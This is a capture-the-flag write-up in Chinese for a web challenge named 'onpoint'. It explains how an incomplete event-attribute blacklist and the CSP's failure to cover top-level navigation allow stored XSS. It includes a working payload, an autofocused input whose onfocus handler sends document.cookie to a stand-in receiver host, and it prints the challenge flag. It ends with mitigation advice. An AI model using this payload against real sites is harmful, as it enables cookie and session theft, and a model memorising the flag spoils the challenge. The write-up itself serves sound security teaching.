# onpoint

## 题目简述

站点允许发表内容并向管理员机器人举报指定文章。用户内容会原样进入 HTML，后端只用关键词黑名单阻挡部分标签和事件属性；同时 CSP 允许内联脚本语义，但限制常见的图片与 `fetch` 外传。管理员机器人的 `flag` Cookie 可被 JavaScript 读取。

## 解题过程

过滤器遗漏了 `onfocus`。可以构造一个自动获得焦点的输入框，让事件处理器在页面打开时执行，并通过顶层导航绕过 `connect-src`、`img-src` 等外连限制：

    <input onfocus="location=`https://receiver.example/?c=`+document.cookie" autofocus="">

把 payload 保存到文章或评论后，将对应的 `getpost` 页面 URL 交给举报接口。管理员机器人加载页面，`autofocus` 使输入框获得焦点并触发 `onfocus`，随后浏览器导航至接收地址，查询参数中带出 Cookie。用取得的 flag Cookie 即可读到：

    byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}

顶层导航之所以重要，是因为它不属于被 CSP 禁止的 XHR、Fetch 或图片加载；若只测试常见外传 API，容易误判为无法利用。

## 方法总结

事件属性黑名单无法穷举 HTML 的执行面，CSP 也必须同时约束脚本来源并考虑导航等数据通道。正确修复是使用成熟的上下文编码或严格 HTML 清洗器，并把敏感 Cookie 设为 `HttpOnly`；CSP 作为额外防线，不应承担输入净化职责。
